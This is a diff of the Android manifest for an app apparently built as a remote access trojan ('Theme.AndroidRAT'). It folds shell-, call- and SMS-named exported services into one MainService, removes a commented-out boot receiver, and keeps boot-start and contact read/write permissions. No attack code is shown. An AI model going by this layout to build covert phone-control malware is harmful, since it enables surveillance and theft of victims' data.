@@ -14,8 +14,8 @@
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.READ_CONTACTS" />
     <uses-permission android:name="android.permission.WRITE_CONTACTS" />
-    <uses-permission android:name="android.permission.INTERNET"/>
-    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
 
     <uses-feature
         android:name="android.hardware.camera"
@@ -29,17 +29,9 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.AndroidRAT">
         <service
-            android:name=".bin_shService"
+            android:name=".MainService"
             android:enabled="true"
-            android:exported="true" />
-        <service
-            android:name=".CallService"
-            android:enabled="true"
-            android:exported="true" />
-        <service
-            android:name=".SMSService"
-            android:enabled="true"
-            android:exported="true" />
+            android:exported="true"></service>
 
         <activity android:name=".MainActivity">
             <intent-filter>
@@ -48,16 +40,6 @@
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
-
-<!--        <receiver-->
-<!--            android:name=".BootCompleteReceiver"-->
-<!--            android:enabled="true"-->
-<!--            android:exported="true">-->
-<!--            <intent-filter>-->
-<!--                <action android:name="android.intent.action.BOOT_COMPLETED" />-->
-<!--            </intent-filter>-->
-
-<!--        </receiver>-->
     </application>
 
 </manifest>
